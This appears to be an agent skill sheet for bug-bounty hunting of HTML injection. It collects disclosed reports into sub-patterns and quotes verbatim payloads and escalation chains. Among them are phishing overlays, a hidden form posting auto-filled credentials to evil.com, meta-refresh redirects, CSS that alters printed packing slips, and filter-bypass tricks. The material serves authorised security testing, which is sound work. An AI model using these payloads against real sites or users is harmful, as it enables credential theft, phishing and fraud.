---
name: hunter-l3-html-injection
description: "Use when hunting HTML Injection on a target. Loads the L3 technique sheet: HTML Injection is the injection of arbitrary HTML markup (not necessarily JavaScript) into content rendered to other users — most commonly into transactional emails, reflected query parameters, and rich-text fields that bypass sanitization."
domain: cybersecurity
subdomain: web
tags:
- web
- html-injection
- hunting
- l3
version: '1.0'
---

# HTML Injection — Technique Sheet

## Overview

HTML Injection is the injection of arbitrary HTML markup (not necessarily JavaScript) into content rendered to other users — most commonly into transactional emails, reflected query parameters, and rich-text fields that bypass sanitization. On its own it is frequently a "medium," but the records show it consistently escalates to phishing (forged emails from legitimate company addresses), credential harvesting via injected login forms, forced redirects via meta refresh, physical-impact scenarios (printed packing slips), and full account takeover chains. It pays best where the injected content renders in a trusted context: company-sent emails, support/invoice UIs, and government/commerce domains.

## Distinct sub-patterns

### 1. HTML in reflected query parameters (`q`, `q`-style search params)

- Endpoint shape: `GET /search.html?q=...`, `GET /{code_country}/search?q=...`, ads-platform search endpoints.
- Payload that fired (Informatica, id=1081656):
  `1"><img src=https://www.no-gods-no-masters.com/images_designs/anonymous-gandhi-d001001207265.png>"@x.y " / <a href="//bf.am">Welcome</a>`
- Payload that fired (Snapchat, id=2018615, URL-encoded):
  `%3Ca%20style=%22position:absolute;margin:50px;%20background-color:%20yellow;%20z-index:1000;top:50px;padding:100px;font-weight:bold;font-size:45px;color:red;%22%20href=%22https://evil.com%22%3EClick%20here%20for%20win%201000%E2%82%AC!%3C/a%3E`
  — note the absolute-positioned, high-z-index, visually loud overlay link.
- Root cause: parameter reflected into page HTML without encoding.
- Impact proven: injected `<img>`/`<a>` rendered on staging + production; defacement + phishing links on newsroom.snap.com search pages.
- Exemplars: 1081656 (Informatica), 2018615 (Snapchat), 2299529 (TikTok Ads, `<h1>HTML_Injection</h1>`).

### 2. HTML in other reflected params (error pages, IDs, misc)

- Endpoint shapes:
  - `GET /Errors.aspx?aspxerrorpath=...` (ASP.NET error page; payload `Gxss` confirmed reflection, id=1844830, U.S. Dept of State)
  - `GET /card.xq?id=...` (id=1810656, U.S. Dept of State) — payload broke out of a `<title>` context:
    `</title><body style="background: green;"><div class="container"><form action="https://www.evil.com" method="post" class="form" style="display: block;"><label for="pnumber">phone number </label>...`
  - `GET /?txHash=...` (id=324548, MyCrypto):
    `qwqwq%3C%20SRC=%22jav&#x0D;ascript:alert(0);"> <a href="https://securityz.net"><img src="https://securityz.net/mycrypto.jpeg"></a>a>qwqw#check-tx-status` — reflected via `ng-bind-html` without sanitization.
  - Generic `show` parameter (id=2061049, Mars): `<a href=https://evil.example>Click</a>`
- Root cause: reflection into error pages / app markup without neutralization; note the `</title>` context-breakout technique on card.xq.
- Impact proven: full phishing login form on labs.history.state.gov; page content modification for phishing; attacker image/href rendered in a crypto-wallet popup (private-key theft potential).
- Exemplars: 1810656, 1844830, 324548, 2061049.

### 3. HTML in registration/profile name fields → rendered in company-sent emails (the largest cluster)

This is the highest-yield sub-pattern in the records: any field captured at signup or profile-edit that gets interpolated into a transactional email rendered as HTML.

- Endpoint shapes / fields:
  - First/Last Name at registration: MTN Group `POST /#/auth/registerUser` (id=1256496, `<h1>Ibrahim</h1>` rendered in the confirmation email); Acronis first-name fields (id=1536896/1600720):
    `"/><img src="x"><a href="https://evil.com">login</a>`
  - Name field on signup: Rocket.Chat (id=833470):
    `"><img src=...anonymous-gandhi...png>"@x.y`
  - Business name: Autodesk `POST signup` (id=2978923): `<img src=x onerror=alert(document.domain)>`
  - First Name on trial form: PortSwigger `POST /burp/dast/trial` (id=3556892):
    `"<h1><a href="https://zorixu.com">Click here for exclusive offers</a></h1>`
  - Invite first_name: RelateIQ `POST /invite` (id=2735):
    `You have been hacked. Click <a href="http://phishing-site">here</a> to reset your password.<div style="display:none">`
  - Nickname → outbound emails (id=57914, Enter/romit.io): `"><a href="google.com"` (note: only the `<` character was unfiltered).
- Root cause: field stored unescaped, then interpolated into an HTML email template; the email renders in the victim's mail client.
- Impact proven: HTML rendered in emails sent from the company's own addresses (Acronis, PortSwigger, RelateIQ's notify@relateiq.com — a fully forged email from a legit server); phishing links; Acronis required the victim to confirm their email first (an interaction gate, still accepted).
- Exemplars: 1256496, 1536899, 1600720, 2978923, 3556892, 2735, 833470, 57914.

### 4. HTML in other email-emitting fields (invite messages, workspace names, newsletter names)

- Endpoint shapes / fields:
  - Mattermost "invite members" custom message (id=1443567):
    `<a href=evil.com>click</a>\n<input type=x>`
  - Slack workspace `name` at `POST` workspace creation (id=1461194) — embedded into the 2FA email: `<img src=x onerror=alert(1)>` (payload not executed as XSS; rendered in email).
  - Newsletter subscription Name field passed to the getresponse service (id=1108504, CS Money): `<h1>injected</h1>` — reflected in the subscription email rendered by the third-party service.
  - Dashboard share → email invitation message (id=904064, U.S. DoD): arbitrary HTML (formatting/img) in the share message → spearphishing email delivered from a legitimate domain-owned address.
- Root cause: user-supplied text passed unsanitized into HTML email bodies, including via third-party email services (getresponse).
- Impact proven: phishing links and input fields in recipient mail clients; spearphishing from legit domain addresses.
- Exemplars: 1443567, 1461194, 1108504, 904064.

### 5. HTML in rich-text / content fields rendered to other users (stored)

- Endpoint shapes / fields:
  - Product review body (id=1036995, Judge.me): `<a href=https://google.com/>CLICK HERE</a>` — rendered raw on the product review page.
  - Polls app poll description (id=1108420, Nextcloud) — the showcase payload:
    `<br/> <br/><br/><br/><br/><br/><marquee><p style="color:red;"><b>!!!!! IMPORTANT message from Nextcloud administrator !!!!!!</b></p></marquee><br/><br/> A security issue was found last night.<br/> <p style="color:green;">Please go to manually on <a><b>changing-password.cloud.evil.com</a></b> to rese...`
    — fake admin password-reset notice → credential phishing; also client-side DoS via infinite iframe loading.
  - LinkedIn Groups event Description (id=2215418): `<a href="https://malicious-site.com">Click me!</a>` — rendered in public event search results.
  - LinkedIn Premium support chat message (id=3079966): `<a href="https://evil.com">CLICK</a>` — rendered as a real clickable link in the chat window; support employee clicking gets redirected to a phishing site.
- Root cause: content field rendered as HTML instead of escaped plain text.
- Impact proven: credential-phishing pages, clickable attacker links in staff-facing chat, defacement.
- Exemplars: 1036995, 1108420, 2215418, 3079966.

### 6. Injected HTML form for credential exfiltration (invoice memo)

- Endpoint shape: `POST /invoices`, memo field (id=1257767, Stripe).
- Payload (verbatim):
  `<form action="//evil.com" method="GET"><input type="text" name="u" style='opacity:0;'><input type="password" name="p" style='opacity:0;'><input type="submit" name="s" value="Load more content">`
- Root cause: memo field renders raw HTML.
- Impact proven: an HTML login form inside a Stripe invoice; with browser password auto-fill populating the invisible fields, clicking "Load more content" submits the victim's saved email/password to the attacker URL — full account takeover chain.
- Chain: inject form in memo → victim's browser auto-fills saved credentials into invisible inputs → victim clicks submit → credentials land on attacker endpoint.
- Exemplar: 1257767.

### 7. Meta-refresh forced redirect from a stored display name

- Endpoint shape: Nextcloud Contacts → create Circle, display name (id=2210038).
- Payload: `<meta http-equiv="refresh" content="2; https://evil.com/" />`
- Root cause: circle display names rendered without HTML encoding in the "Shared with Circles" admin UI.
- Impact proven: an admin viewing Files > Shared with Circles was redirected to evil.com within 2 seconds (video PoC).
- Exemplar: 2210038.

### 8. CSS injection into printed output (packing slip)

- Endpoint shape: `POST /checkout`, email field reflected into the packing slip (id=1087122, Shopify).
- Payload (verbatim):
  `"<style>.flex-line-item-quantity>p{font-size:0}.flex-line-item-quantity:after{content:'1337\0000a0of\0000a01337';margin-left:420px;}</style>"@gmail.com`
  (the trailing `@gmail.com` makes it a valid email address).
- Root cause: customer email reflected unsanitized into the packing-slip HTML.
- Impact proven: printed packing slip showed 1337 items instead of 1 → enables physical theft of goods; bulk printing means attacker slips alter other customers' printed output.
- Chain: crafted email at checkout → order one item → shop employee prints packing slip → injected CSS rewrites the printed quantity.
- Exemplar: 1087122.

### 9. Markdown-parser attribute injection

- Endpoint shape: report-body markdown, link-title position: `[title](url "title")` (id=112935, HackerOne).
- Payload (verbatim):
  `[test](http://www.torontowebsitedeveloper.com "test ismap="alert xss" yyy="test"")`
  Also id=46312: `[text](http://danlec.com " @danlec ")` — user-mention links injected after markdown processing land inside existing link attribute values, producing unexpected `danlec"`, `reports`, `46072"` attributes.
- Root cause: markdown link-title parsing recursively matches quotes, allowing arbitrary extra attributes to be injected into the rendered `<a>` tag; or user-mention/replacement links are inserted after markdown rendering, landing inside attribute values.
- Impact proven: arbitrary attributes rendered on HackerOne `<a>` tags; XSS not demonstrated in these records (treat as attribute-injection foothold).
- Exemplars: 112935, 46312.

### 10. URI-scheme filter bypass in an HTML mail renderer

- Endpoint shape: `GET /index.php/apps/mail/accounts/{id}/folders/{folder}/messages/{id}/html` (id=175085, Nextcloud Mail).
- Payload (verbatim, partial):
  `<a href="http://file.trich.im">Link via redirect</a>` / `<a href='ftp://chim:chim@localhost/hihi.html'>Bypass link</a>` / `Bypass img <img src='/nextcloud/index.php/s/...` (relative scheme)
- Root cause: the scheme whitelist only allows http/https/cid, so `ftp://` and relative (NULL-scheme) URLs pass; `target=_blank` added without `rel=noopener`.
- Impact proven: bypassed the image filter and CSP, enabling HTML content spoof, opener control (reverse tabnabbing), and account-ID leak.
- Exemplar: 175085.

### 11. HTML injection into a desktop client notification UI

- Endpoint shape: folder names/aliases on a shared instance → ownCloud desktop client selective-sync notification (id=206877).
- Payload (verbatim):
  `"><&#x2f;a><p><center><h1><strong>Important!<&#x2f;strong> Please go to nextcloud.com and relogin!<&#x2f;center><&#x2f;h1><&#x2f;p><!-- `
  (note the HTML-entity-encoded slashes `&#x2f;` used to survive filtering, and trailing `<!--` to swallow trailing markup).
- Root cause: user-supplied folder names concatenated into an HTML string without escaping in the client.
- Impact proven: arbitrary HTML rendered in the victim's desktop notification UI (ownCloud 2.3.x / 2.2.x, OS X); similar injection points exist throughout the client.
- Exemplar: 206877.

### 12. Reflected params in signup / auth flows

- Endpoint shape: `GET /signup` with `invite_code`, `invite_name` (id=31554, X/Twitter) — payload `invite_name=<crafted message>` (payload not stated verbatim).
- Root cause: parameters reflected unescaped into the signup page HTML.
- Impact proven: crafted fake-billing messages with malicious links displayed to users on the signup page.
- Also: Deriv.com `underlying` parameter (id=109832) — HTML injection, payload not stated; another researcher later bypassed it to execute script.
- And: U.S. DoD misconfigured website allowing injection of remote content via a crafted URL (id=195356, endpoint/param not stated).
- Exemplars: 31554, 109832, 195356.

## Bypass / chain notes

- Context breakouts seen in the records: `</title>` to escape a title element (id=1810656); `"><img...` quote-breakout into attribute context (1081656, 833470, 57914, 206877); `"/><img...` for attribute-position reflection in emails (Acronis).
- Filter bypasses: entity-encoded slashes (`&#x2f;`) to survive naive filtering (206877); `ftp://` and relative/NULL-scheme URLs against an http/https/cid whitelist (175085); `jav&#x0D;ascript:` CR-embedded scheme in `SRC=` (324548); relative `//evil.com` protocol-relative form actions (1257767) and `href="//bf.am"` (1081656).
- Email-rendering chains are the dominant escalation: register/profile field → transactional email rendered as HTML in victim's mail client → phishing from a company domain. Acronis shows the victim must confirm their email first — still accepted as valid.
- Credential-exfil chain (Stripe 1257767): invisible `opacity:0` inputs + browser password auto-fill + a plausible submit button ("Load more content") = saved-credential theft.
- Print-physical chain (Shopify 1087122): email-valid payload (`...@gmail.com`) doubles as a CSS injection that changes printed quantities on packing slips.
- Third-party hop: payload travels through an external service (getresponse, 1108504) and renders there — test fields that feed marketing/email platforms, not just the site's own templates.
- Markdown attribute injection (112935) is a foothold: attribute injection often precedes XSS if an event-capable attribute or javascript: href can be reached; these records did not demonstrate execution.

## Gotchas / what NOT to do

- HTML injection ≠ XSS: 112935 and 46312 (HackerOne markdown) proved attribute injection but not execution — don't claim XSS without a working execution PoC.
- Some records need victim interaction: Acronis email payloads fired only after the victim confirmed their address — note the gate in your report rather than hiding it.
- Don't ignore email-validity constraints: the Shopify payload had to remain a syntactically valid email address; the attack lives inside `"<style>...</style>"@gmail.com`.
- Self-XSS-looking spots (invite messages, own inputs) only count when the content reaches another user's context (email recipient, admin viewing shared-with-circles, support agent viewing chat, employee printing a slip).
- Simple `<h1>` payloads (MTN, CS Money, TikTok) are valid proof-of-render but pair them with a stated phishing/defacement scenario for impact.
- Payload not stated in several records (109832, 195356, 31554's exact string) — don't fabricate; re-derive from the reflection context.

## Real-world impact examples

- Stripe (1257767): injected login form in an invoice memo + password auto-fill → victim's saved credentials exfiltrated on click → full account takeover.
- Shopify (1087122): CSS-injected packing slip printed "1337 of 1337" instead of 1 — direct physical goods theft, affecting other customers in bulk printing.
- U.S. Dept of State (1810656): complete phishing login/phone-number form posted to evil.com, served from labs.history.state.gov via `card.xq?id=`.
- RelateIQ (2735): arbitrary forged HTML emails sent from notify@relateiq.com (the company's own server) to any recipient.
- Nextcloud Polls (1108420): fake "message from administrator" password-reset page inside a poll description → credential phishing.
- Nextcloud Contacts (2210038): admin auto-redirected to evil.com within 2 seconds via meta refresh in a circle name.
- U.S. DoD (904064): spearphishing email with attacker HTML delivered from a legitimate domain-owned address.
- MyCrypto (324548): attacker image/link rendered in a wallet-site popup — a context where victims are primed to paste private keys.